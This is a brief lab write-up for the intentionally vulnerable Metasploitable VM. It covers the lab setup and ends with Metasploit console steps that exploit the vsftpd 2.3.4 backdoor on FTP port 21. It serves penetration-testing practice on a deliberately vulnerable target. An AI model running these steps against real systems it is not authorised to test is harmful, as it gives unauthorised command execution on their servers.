# Metasploitable-Writeup

## 📌 What is Metasploitable ? 

Metasploitable is an intentionally vulnerable Linux virtual machine that can be used to conduct security training, test security tools, and practice common penetration testing techniques. The VM will run on any recent VMware products and other visualization technologies such as VirtualBox.

## ⚙️ Prepare our pen-lab.

We will need : 
- VMware , VitrualBox or any other visualization product.
- installed a Linux Machine ( ideally [Kali Linux](https://www.kali.org/) or [Parrot Os](https://www.parrotsec.org/) )
- Installed [Metasploitable Machine](https://sourceforge.net/projects/metasploitable/)

P.s. The Linux and Metasploitable machines should be in the same network group

## ⚈ FTP ( port : 21 ) Exploit

In our scan result we can see : 

**FTP Service (port:21) Exploit : **

- We will use the exploit [VSFTPD v2.3.4 Backdoor Command Execution](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/).

1. use exploit/unix/ftp/vsftpd_234_backdoor
2. show options
3. set RHOSTS metasploit_ip
4. exploit
